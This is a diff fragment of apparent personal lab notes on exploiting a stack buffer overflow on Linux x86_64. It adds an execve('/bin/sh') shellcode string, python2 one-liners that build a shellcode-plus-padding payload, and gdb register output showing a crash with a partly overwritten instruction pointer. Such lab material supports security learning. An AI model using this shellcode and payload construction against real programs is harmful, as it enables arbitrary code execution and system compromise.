@@ -140,4 +140,31 @@ Pattern buffer found at:
 
 0x00007fffffffe0c0 : offset    0 - size  300 ($sp + -0x48 [-18 dwords])
 
+# Linux/x86_64 execve("/bin/sh"); 30 bytes shellcode 
+
+["\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"](http://shell-storm.org/shellcode/files/shellcode-603.php)
+
+┌─[kali@kali]─[~/Desktop/Buffer_linux]
+└──╼ $python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+b"A"*42+"BBBBBB"' > ff
+
+┌─[kali@kali]─[~/Desktop/Buffer_linux]
+└──╼ $python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+b"A"*42+"BBBBBB"' > ff
+
+RSI: 0x7ffff7faea03 --> 0xfb1680000000000a 
+
+RDI: 0x7ffff7fb1680 --> 0x0 
+
+RBP: 0x4242424141414141 ('AAAAABBB')
+
+RSP: 0x7fffffffe110 --> 0x7fffffffe1f8 --> 0x7fffffffe4df ("/home/kali/Desktop/Buffer_linux/app")
+
+RIP: 0x7f000a424242 
+
+R8 : 0x7fffffffe0c0 --> 0x91969dd1bb48c031
+
+Stopped reason: SIGSEGV
+
+0x00007f000a424242 in ?? ()
+
+
 
